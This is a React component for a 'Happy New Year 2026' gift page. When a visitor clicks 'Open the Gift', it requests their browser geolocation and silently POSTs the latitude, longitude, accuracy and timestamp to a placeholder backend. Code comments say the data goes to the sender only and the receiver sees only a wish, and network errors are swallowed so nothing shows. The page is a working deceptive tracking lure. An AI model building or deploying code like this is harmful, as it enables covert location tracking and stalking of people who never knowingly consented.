import { useState } from "react";

function App() {
  const [giftOpened, setGiftOpened] = useState(false);
  const [error, setError] = useState("");

  const openGift = () => {
    if (!navigator.geolocation) {
      setError("Geolocation is not supported by this browser");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Send location to backend (sender only)
        fetch("https://YOUR-BACKEND-URL.onrender.com/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString(),
          }),
        }).catch(() => {});

        // Receiver sees only wish
        setGiftOpened(true);
      },
      () => {
        setError("Location permission denied");
      }
    );
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.heading}>🎉 Happy New Year 2026 🎉</h1>

      {!giftOpened && (
        <button onClick={openGift} style={styles.button}>
          🎁 Open the Gift
        </button>
      )}

      {giftOpened && (
        <p style={styles.message}>
          ✨ May all your wishes come true ✨
        </p>
      )}

      {error && <p style={styles.error}>{error}</p>}
    </div>
  );
}

const styles = {
  container: {
    height: "100vh",
    background: "linear-gradient(135deg, #ff0080, #7928ca)",
    display: "flex",
    flexDirection: "column",
    justifyContent: "center",
    alignItems: "center",
    color: "#ffffff",
    textAlign: "center",
    padding: "20px",
  },
  heading: {
    fontSize: "3rem",
    marginBottom: "24px",
  },
  button: {
    padding: "14px 32px",
    fontSize: "18px",
    borderRadius: "30px",
    border: "none",
    cursor: "pointer",
    fontWeight: "600",
    backgroundColor: "#ffffff",
    color: "#7928ca",
  },
  message: {
    fontSize: "1.6rem",
    marginTop: "20px",
  },
  error: {
    marginTop: "12px",
    color: "#ffeb3b",
    fontSize: "0.95rem",
  },
};

export default App;
